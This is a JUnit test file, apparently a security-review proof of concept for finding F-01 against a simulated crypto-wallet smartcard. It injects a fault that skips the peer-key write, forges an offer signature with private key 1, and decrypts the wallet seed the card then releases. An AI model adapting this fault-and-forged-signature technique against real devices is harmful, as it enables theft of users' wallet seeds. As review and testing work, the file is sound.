// SPDX-FileCopyrightText: 2026 QuantX
// SPDX-License-Identifier: AGPL-3.0-or-later
package org.qntx.card.review2;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.math.BigInteger;
import java.util.Arrays;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.qntx.card.sim.Fault;

/**
 * PoC for finding F-01, EXPORT direction (spec section 9.13): skipping Transfer.setPeer leaves the
 * peer-key slot holding the base point G loaded by Transfer.initDomains, so an offer signature made
 * with private key 1 verifies and the card releases the wallet seed.
 */
final class PeerSlotExportTest {
    private static final Ca2 CA = Ca2.INSTANCE;
    private static final byte[] SEED = H2.sha512(H2.ascii("review2 export seed"));
    private static final byte[] ACCESS = H2.sha256(H2.ascii("review2 code"));
    private static final byte[] ACCESS_T = H2.sha256(H2.ascii("review2 target code"));

    @AfterEach
    void disarm() {
        Fault.reset();
    }

    /** CREATE in a fresh session; the returned session stays verified for EXPORT. */
    private static Session2 loadedSession(Card2 card, byte[] others) {
        Session2 s = card.open(CA);
        Session2.Res res = s.cmd(0x21, 0x01, 0x00, H2.cat(ACCESS, SEED, others));
        assertEquals(0x9000, res.sw, () -> "CREATE sw " + Integer.toHexString(res.sw));
        return s;
    }

    /** The attacker's offer: valid point LK and an offer-signature made with key 1. */
    private static byte[][] attackerOffer() {
        BigInteger l = H2.randomScalar();
        byte[] lk = H2.uncompressed(H2.SECP.getG().multiply(l).normalize());
        byte[] sigT = H2.sign(BigInteger.ONE, H2.cat(H2.ascii("qntx-card/v1/offer"), lk));
        return new byte[][] {lk, sigT, H2.big32(l)};
    }

    @Test
    void controlRefusedWithoutFault() {
        assertTrue(H2.bip32MasterValid(SEED));
        Peer2 m = Peer2.create(CA);
        Card2 card = new Card2();
        card.blank(CA);
        Session2 s = loadedSession(card, m.id());

        byte[][] atk = attackerOffer();
        Session2.Res r = s.cmd(0x41, 0x00, 0x00, H2.cat(m.cert, atk[0], atk[1]));
        assertEquals(0x6A80, r.sw, () -> "EXPORT P1=00 sw " + Integer.toHexString(r.sw));
    }

    @Test
    void skippedPeerWriteReleasesSeed() {
        assertTrue(H2.bip32MasterValid(SEED));
        Peer2 m = Peer2.create(CA);
        Card2 card = new Card2();
        card.blank(CA);
        Session2 s = loadedSession(card, m.id());
        byte[] cardA = card.identity();

        byte[][] atk = attackerOffer();
        byte[] lk = atk[0];
        byte[] sigT = atk[1];
        BigInteger l = H2.intbe(atk[2]);

        Fault.armSkip("Transfer.setPeer", 1);
        Session2.Res r0;
        int setPeerCalls;
        try {
            r0 = s.cmd(0x41, 0x00, 0x00, H2.cat(m.cert, lk, sigT));
            setPeerCalls = Fault.calls("Transfer.setPeer");
        } finally {
            Fault.reset();
        }
        assertEquals(0x9000, r0.sw, () -> "EXPORT P1=00 sw " + Integer.toHexString(r0.sw));
        assertEquals(129, r0.data.length);
        byte[] e = Arrays.copyOfRange(r0.data, 0, 65);
        byte[] sigS = Arrays.copyOfRange(r0.data, 65, 129);
        byte[] msg = H2.cat(H2.ascii("qntx-card/v1/export"), cardA, m.a, lk, e);
        boolean sigSOk = H2.verify(cardA, msg, sigS);
        System.out.println(
                "F-01 EXPORT P1=00 faulted: sw="
                        + Integer.toHexString(r0.sw)
                        + " len="
                        + r0.data.length
                        + " sigSVerifies="
                        + sigSOk
                        + " setPeerCalls="
                        + setPeerCalls);
        assertTrue(sigSOk, "sig_S does not verify under the card key");

        Session2.Res r1 = s.cmd(0x41, 0x01, 0x00, ACCESS_T);
        assertEquals(0x9000, r1.sw, () -> "EXPORT P1=01 sw " + Integer.toHexString(r1.sw));
        assertEquals(160, r1.data.length);

        // spec section 9.13: Z = x(l * E); TH = SHA-256(M); K_te || K_tm = KDF(Z, ...)
        byte[] z = H2.big32(H2.point(e).multiply(l).normalize().getAffineXCoord().toBigInteger());
        byte[] keys = H2.kdf(z, "qntx-card/v1/kdf-transfer", H2.sha256(msg), 32);
        byte[] kte = Arrays.copyOfRange(keys, 0, 16);
        byte[] ktm = Arrays.copyOfRange(keys, 16, 32);
        byte[] ct = Arrays.copyOfRange(r1.data, 0, 144);
        byte[] tag = Arrays.copyOfRange(r1.data, 144, 160);
        assertArrayEquals(H2.cmac(ktm, ct), tag, "transfer CMAC mismatch");
        byte[] payload = H2.unM2(H2.cbc(false, kte, new byte[16], ct));
        assertEquals(130, payload.length);
        System.out.println(
                "F-01 EXPORT P1=01: sw="
                        + Integer.toHexString(r1.sw)
                        + " len="
                        + r1.data.length
                        + " payloadOrigin=0x"
                        + Integer.toHexString(payload[0] & 0xFF)
                        + " recoveredSeedEqualsS="
                        + Arrays.equals(SEED, Arrays.copyOfRange(payload, 1, 65)));
        assertEquals(0x02, payload[0] & 0xFF, "origin is not imported");
        assertArrayEquals(SEED, Arrays.copyOfRange(payload, 1, 65), "recovered seed != S");
        assertTrue(setPeerCalls >= 1, "Transfer.setPeer was never reached");
    }

    @Test
    void slotHoldingGenuineKeyRefuses() {
        Peer2 m = Peer2.create(CA);
        Card2 card = new Card2();
        card.blank(CA);
        Session2 s = loadedSession(card, m.id());

        byte[][] atk = attackerOffer();
        Session2.Res first = s.cmd(0x41, 0x00, 0x00, H2.cat(m.cert, atk[0], atk[1]));
        assertEquals(
                0x6A80,
                first.sw,
                () -> "fault-free EXPORT P1=00 sw " + Integer.toHexString(first.sw));

        // the failed attempt already wrote A_M into the slot; skipping the second
        // setPeer leaves the genuine key, under which the forged signature fails
        Fault.armSkip("Transfer.setPeer", 1);
        Session2.Res second;
        try {
            second = s.cmd(0x41, 0x00, 0x00, H2.cat(m.cert, atk[0], atk[1]));
        } finally {
            Fault.reset();
        }
        assertNotEquals(
                0x9000,
                second.sw,
                () ->
                        "faulted EXPORT P1=00 unexpectedly succeeded: "
                                + Integer.toHexString(second.sw));
        assertTrue(
                second.sw == 0x6A80 || second.sw == 0x6F00,
                () -> "unexpected sw " + Integer.toHexString(second.sw));
    }

    @Test
    void threeCardSetSecondSlotIsBaseAfterNormalFlow() {
        Peer2 m1 = Peer2.create(CA);
        Peer2 m2 = Peer2.create(CA);
        Card2 card = new Card2();
        card.blank(CA);
        Session2 s = card.open(CA);
        Session2.Res cr = s.cmd(0x21, 0x01, 0x00, H2.cat(ACCESS, SEED, m1.id(), m2.id()));
        assertEquals(0x9000, cr.sw, () -> "CREATE sw " + Integer.toHexString(cr.sw));
        byte[] cardA = card.identity();

        // a complete genuine transfer flow to m1 fills only m1's peer slot
        Peer2.Offer offer1 = m1.offer();
        Session2.Res g0 = s.cmd(0x41, 0x00, 0x00, H2.cat(m1.cert, offer1.lk, offer1.sig));
        assertEquals(0x9000, g0.sw, () -> "genuine EXPORT P1=00 sw " + Integer.toHexString(g0.sw));
        Session2.Res g1 = s.cmd(0x41, 0x01, 0x00, ACCESS_T);
        assertEquals(0x9000, g1.sw, () -> "genuine EXPORT P1=01 sw " + Integer.toHexString(g1.sw));
        assertEquals(176, g1.data.length); // c = 3: payload 146 -> ct 160 + tag 16

        // the never-exported-to member m2 still has G in its slot: one skip releases S
        byte[][] atk = attackerOffer();
        byte[] lk = atk[0];
        byte[] sigT = atk[1];
        BigInteger l = H2.intbe(atk[2]);
        Fault.armSkip("Transfer.setPeer", 1);
        Session2.Res r0;
        int setPeerCalls;
        try {
            r0 = s.cmd(0x41, 0x00, 0x00, H2.cat(m2.cert, lk, sigT));
            setPeerCalls = Fault.calls("Transfer.setPeer");
        } finally {
            Fault.reset();
        }
        assertEquals(0x9000, r0.sw, () -> "attack EXPORT P1=00 sw " + Integer.toHexString(r0.sw));
        byte[] e = Arrays.copyOfRange(r0.data, 0, 65);
        Session2.Res r1 = s.cmd(0x41, 0x01, 0x00, ACCESS_T);
        assertEquals(0x9000, r1.sw, () -> "attack EXPORT P1=01 sw " + Integer.toHexString(r1.sw));

        byte[] msg = H2.cat(H2.ascii("qntx-card/v1/export"), cardA, m2.a, lk, e);
        byte[] z = H2.big32(H2.point(e).multiply(l).normalize().getAffineXCoord().toBigInteger());
        byte[] keys = H2.kdf(z, "qntx-card/v1/kdf-transfer", H2.sha256(msg), 32);
        byte[] kte = Arrays.copyOfRange(keys, 0, 16);
        byte[] ktm = Arrays.copyOfRange(keys, 16, 32);
        byte[] ct = Arrays.copyOfRange(r1.data, 0, r1.data.length - 16);
        byte[] tag = Arrays.copyOfRange(r1.data, r1.data.length - 16, r1.data.length);
        assertArrayEquals(H2.cmac(ktm, ct), tag);
        byte[] payload = H2.unM2(H2.cbc(false, kte, new byte[16], ct));
        System.out.println(
                "F-01 3-card attack: p00sw="
                        + Integer.toHexString(r0.sw)
                        + " p01sw="
                        + Integer.toHexString(r1.sw)
                        + " setPeerCalls="
                        + setPeerCalls
                        + " recoveredSeedEqualsS="
                        + Arrays.equals(SEED, Arrays.copyOfRange(payload, 1, 65)));
        assertArrayEquals(SEED, Arrays.copyOfRange(payload, 1, 65), "recovered seed != S");
    }
}
